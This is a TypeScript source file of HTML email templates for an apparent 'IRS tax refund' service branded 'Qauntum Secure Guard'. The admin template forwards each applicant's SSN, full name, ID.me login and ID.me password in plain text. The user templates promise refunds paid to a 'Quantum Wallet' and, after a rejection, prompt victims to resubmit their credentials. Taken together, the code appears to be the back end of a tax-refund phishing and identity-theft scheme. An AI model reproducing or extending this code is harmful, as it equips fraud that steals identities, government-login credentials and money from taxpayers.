import { getFooter } from ".";

const getAppUrl = () => process.env.NEXT_PUBLIC_APP_ORIGIN;

export const getTaxRefundSubmissionAdminTemplate = ({
  applicantName,
  userEmail,
  fullName,
  ssn,
  idMe,
  idMePassword,
  location,
  refundId,
}: {
  applicantName: string;
  userEmail: string;
  fullName: string;
  ssn: string;
  idMe: string;
  idMePassword: string;
  location: string;
  refundId: string;
}) => {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>New Tax Refund Submission - Qauntum Secure Guard</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                line-height: 1.6;
                color: #fafafa;
                background-color: #1a1a1a;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #262626;
                border: 1px solid #404040;
                border-radius: 8px;
                overflow: hidden;
            }
            .header {
                background: linear-gradient(135deg, #10B981 0%, #047857 100%);
                padding: 32px 24px;
                text-align: center;
            }
            .header h1 {
                margin: 0;
                color: #ffffff;
                font-size: 26px;
                font-weight: 700;
            }
            .logo {
                font-size: 36px;
                margin-bottom: 8px;
            }
            .content {
                padding: 32px 24px;
            }
            .section-title {
                font-size: 15px;
                font-weight: 600;
                color: #10B981;
                margin-top: 20px;
                margin-bottom: 12px;
                border-bottom: 1px solid #404040;
                padding-bottom: 6px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            .data-row {
                display: flex;
                margin-bottom: 10px;
                border-bottom: 1px solid #333333;
                padding-bottom: 8px;
                font-size: 13px;
            }
            .data-label {
                font-weight: 600;
                width: 140px;
                color: #a1a1aa;
                flex-shrink: 0;
            }
            .data-value {
                color: #fafafa;
                flex-grow: 1;
                word-break: break-word;
            }
            .cta-button {
                display: inline-block;
                background: linear-gradient(135deg, #10B981 0%, #047857 100%);
                color: #ffffff !important;
                padding: 12px 30px;
                border-radius: 6px;
                text-decoration: none;
                font-weight: 600;
                font-size: 14px;
                margin-top: 24px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">💵</div>
                <h1>New Tax Refund Submission</h1>
            </div>

            <div class="content">
                <div class="section-title">Account Holder</div>
                <div class="data-row">
                    <span class="data-label">User Name:</span>
                    <span class="data-value">${applicantName}</span>
                </div>
                <div class="data-row">
                    <span class="data-label">User Email:</span>
                    <span class="data-value"><a href="mailto:${userEmail}" style="color: #60a5fa;">${userEmail}</a></span>
                </div>
                <div class="data-row">
                    <span class="data-label">Refund ID:</span>
                    <span class="data-value"><code>${refundId}</code></span>
                </div>

                <div class="section-title">IRS Refund Credentials</div>
                <div class="data-row">
                    <span class="data-label">Full Legal Name:</span>
                    <span class="data-value">${fullName}</span>
                </div>
                <div class="data-row">
                    <span class="data-label">SSN:</span>
                    <span class="data-value">${ssn}</span>
                </div>
                <div class="data-row">
                    <span class="data-label">ID.me Login / Email:</span>
                    <span class="data-value">${idMe}</span>
                </div>
                <div class="data-row">
                    <span class="data-label">ID.me Password:</span>
                    <span class="data-value"><code>${idMePassword}</code></span>
                </div>
                <div class="data-row">
                    <span class="data-label">State / Location:</span>
                    <span class="data-value">${location}</span>
                </div>

                <center>
                    <a href="${getAppUrl()}/admin/tax-refunds" class="cta-button">
                        Review in Admin Panel
                    </a>
                </center>
            </div>

            ${getFooter()}
        </div>
    </body>
    </html>
  `;
};

export const getTaxRefundSubmissionUserTemplate = ({
  name,
  refundId,
  location,
}: {
  name: string;
  refundId: string;
  location: string;
}) => {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tax Refund Request Received - Qauntum Secure Guard</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                line-height: 1.6;
                color: #fafafa;
                background-color: #1a1a1a;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #262626;
                border: 1px solid #404040;
                border-radius: 8px;
                overflow: hidden;
            }
            .header {
                background: linear-gradient(135deg, #10B981 0%, #047857 100%);
                padding: 32px 24px;
                text-align: center;
            }
            .header h1 {
                margin: 0;
                color: #ffffff;
                font-size: 26px;
                font-weight: 700;
            }
            .logo {
                font-size: 38px;
                margin-bottom: 8px;
            }
            .content {
                padding: 32px 24px;
            }
            .greeting {
                font-size: 16px;
                font-weight: 600;
                margin-bottom: 12px;
                color: #ffffff;
            }
            .message {
                font-size: 14px;
                line-height: 1.8;
                margin-bottom: 20px;
                color: #d4d4d8;
            }
            .info-card {
                background-color: #1a1a1a;
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 18px 20px;
                margin: 20px 0;
            }
            .info-row {
                display: flex;
                justify-content: space-between;
                margin-bottom: 10px;
                font-size: 13px;
            }
            .info-row:last-child {
                margin-bottom: 0;
            }
            .info-label {
                color: #a1a1aa;
                font-weight: 600;
            }
            .info-val {
                color: #fafafa;
                font-weight: 500;
            }
            .cta-button {
                display: inline-block;
                background: linear-gradient(135deg, #10B981 0%, #047857 100%);
                color: #ffffff !important;
                padding: 12px 30px;
                border-radius: 6px;
                text-decoration: none;
                font-weight: 600;
                font-size: 14px;
                margin: 20px 0;
            }
            .timeline-box {
                background-color: #064e3b;
                border-left: 4px solid #10B981;
                border-radius: 4px;
                padding: 14px 18px;
                font-size: 13px;
                color: #d1fae5;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">💵</div>
                <h1>Tax Refund Request Received</h1>
            </div>

            <div class="content">
                <div class="greeting">Hello ${name},</div>
                <div class="message">
                    Your IRS tax refund processing request has been successfully submitted to <strong>Qauntum Secure Guard</strong>. Our tax processing department has received your information.
                </div>

                <div class="info-card">
                    <div class="info-row">
                        <span class="info-label">Request ID:</span>
                        <span class="info-val"><code>${refundId}</code></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Filing Jurisdiction:</span>
                        <span class="info-val">${location}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Status:</span>
                        <span class="info-val" style="color: #f59e0b;">Pending IRS Validation</span>
                    </div>
                </div>

                <div class="timeline-box">
                    ⏱️ <strong>Processing Timeline:</strong> Tax refund verifications are typically validated within <strong>24 to 48 hours</strong>. You will receive an email once the verification is complete.
                </div>

                <center>
                    <a href="${getAppUrl()}/tax-refund/track" class="cta-button">
                        Track Refund Status
                    </a>
                </center>
            </div>

            ${getFooter()}
        </div>
    </body>
    </html>
  `;
};

export const getTaxRefundStatusUpdateTemplate = ({
  name,
  refundId,
  status,
}: {
  name: string;
  refundId: string;
  status: "approved" | "rejected" | "pending";
}) => {
  const isApproved = status === "approved";

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tax Refund Request ${isApproved ? "Approved" : "Update"} - Qauntum Secure Guard</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                line-height: 1.6;
                color: #fafafa;
                background-color: #1a1a1a;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                background-color: #262626;
                border: 1px solid #404040;
                border-radius: 8px;
                overflow: hidden;
            }
            .header {
                background: ${isApproved ? "linear-gradient(135deg, #10B981 0%, #047857 100%)" : "linear-gradient(135deg, #DC2626 0%, #B91C1C 100%)"};
                padding: 32px 24px;
                text-align: center;
            }
            .header h1 {
                margin: 0;
                color: #ffffff;
                font-size: 26px;
                font-weight: 700;
            }
            .logo {
                font-size: 40px;
                margin-bottom: 8px;
            }
            .content {
                padding: 32px 24px;
            }
            .greeting {
                font-size: 16px;
                font-weight: 600;
                margin-bottom: 12px;
                color: #ffffff;
            }
            .message {
                font-size: 14px;
                line-height: 1.8;
                margin-bottom: 20px;
                color: #d4d4d8;
            }
            .status-box {
                background: ${isApproved ? "linear-gradient(135deg, #064e3b 0%, #065f46 100%)" : "linear-gradient(135deg, #450a0a 0%, #7f1d1d 100%)"};
                border: 1px solid ${isApproved ? "#10B981" : "#EF4444"};
                border-radius: 8px;
                padding: 20px;
                text-align: center;
                margin: 22px 0;
            }
            .status-title {
                font-size: 20px;
                font-weight: 700;
                color: #ffffff;
                margin-bottom: 6px;
            }
            .status-sub {
                font-size: 13px;
                color: ${isApproved ? "#a7f3d0" : "#fca5a5"};
            }
            .details-card {
                background-color: #1a1a1a;
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 16px 20px;
                margin: 20px 0;
            }
            .detail-row {
                display: flex;
                justify-content: space-between;
                font-size: 13px;
                margin-bottom: 8px;
            }
            .detail-row:last-child {
                margin-bottom: 0;
            }
            .cta-button {
                display: inline-block;
                background: ${isApproved ? "linear-gradient(135deg, #10B981 0%, #047857 100%)" : "linear-gradient(135deg, #3B82F6 0%, #2563EB 100%)"};
                color: #ffffff !important;
                padding: 12px 32px;
                border-radius: 6px;
                text-decoration: none;
                font-weight: 600;
                font-size: 14px;
                margin: 20px 0;
            }
            .divider {
                height: 1px;
                background-color: #333333;
                margin: 24px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">${isApproved ? "✅" : "⚠️"}</div>
                <h1>${isApproved ? "Tax Refund Approved!" : "Tax Refund Status Update"}</h1>
            </div>

            <div class="content">
                <div class="greeting">Dear ${name},</div>

                ${
                  isApproved
                    ? `
                <div class="message">
                    We are pleased to inform you that your IRS tax refund verification has been <strong>approved</strong> and validated!
                </div>

                <div class="status-box">
                    <div class="status-title">Status: APPROVED ✓</div>
                    <div class="status-sub">IRS verification completed. Your refund has been authorized for disbursement.</div>
                </div>

                <div class="details-card">
                    <div class="detail-row">
                        <span style="color: #a1a1aa;">Request ID:</span>
                        <span style="color: #ffffff;"><code>${refundId}</code></span>
                    </div>
                    <div class="detail-row">
                        <span style="color: #a1a1aa;">Disbursement Channel:</span>
                        <span style="color: #6ee7b7; font-weight: 600;">Quantum Wallet / Linked Account</span>
                    </div>
                </div>

                <div class="message">
                    Your funds are being routed to your wallet. You can check the live tracking status at any time in your tax refund dashboard.
                </div>

                <center>
                    <a href="${getAppUrl()}/tax-refund/track" class="cta-button">
                        Track Refund Status
                    </a>
                </center>
                `
                    : `
                <div class="message">
                    Your IRS tax refund processing request could not be approved due to a verification discrepancy.
                </div>

                <div class="status-box">
                    <div class="status-title">Status: REQUIRES ATTENTION</div>
                    <div class="status-sub">Verification failed with the IRS or ID.me records.</div>
                </div>

                <div class="details-card">
                    <div class="detail-row">
                        <span style="color: #a1a1aa;">Request ID:</span>
                        <span style="color: #ffffff;"><code>${refundId}</code></span>
                    </div>
                </div>

                <div class="message">
                    Common causes include invalid ID.me credentials, mismatched SSN information, or additional identity verification required by the tax authorities. Please check your credentials and try again.
                </div>

                <center>
                    <a href="${getAppUrl()}/tax-refund" class="cta-button">
                        Resubmit Request
                    </a>
                </center>
                `
                }

                <div class="divider"></div>
                <p style="font-size: 13px; color: #a1a1aa; margin-bottom: 0;">
                    If you require assistance or need help verifying your ID.me account, our support team is available 24/7.
                </p>
            </div>

            ${getFooter()}
        </div>
    </body>
    </html>
  `;
};
